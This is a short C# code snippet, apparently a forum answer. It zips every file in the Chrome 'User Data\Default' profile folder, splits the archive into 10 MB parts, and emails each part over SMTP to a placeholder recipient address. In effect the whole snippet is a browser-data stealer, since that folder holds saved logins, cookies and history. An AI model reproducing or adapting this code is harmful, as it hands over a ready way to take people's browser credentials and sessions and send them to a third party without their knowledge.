    string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default"; 
    
    DirectoryInfo chrome = new DirectoryInfo(local);
    if (chrome.Exists)
    {
        using (ZipFile zip = new ZipFile())
        {
            string[] files = Directory.GetFiles(local);
            zip.AddFiles(files);
            zip.MaxOutputSegmentSize = 10 * 1024 * 1024 ; // 10 mb 
            zip.Save(local + "/test.zip");
            for(int i = 0; i < zip.NumberOfSegmentsForMostRecentSave; i++)
            {
                MailMessage msg = new MailMessage("from@from.com", "to@to.com", "subject", "body");
                // https://msdn.microsoft.com/en-us/library/5k0ddab0%28v=vs.110%29.aspx
                msg.Attachments.Add(new Attachment(local + "/test.z" + i.ToString("00"))); //format i for 2 digits
                SmtpClient sc = new SmtpClient();
                msg.Send(sc); // you should also make a new mailmessage for each attachment.
            }
        }
    }
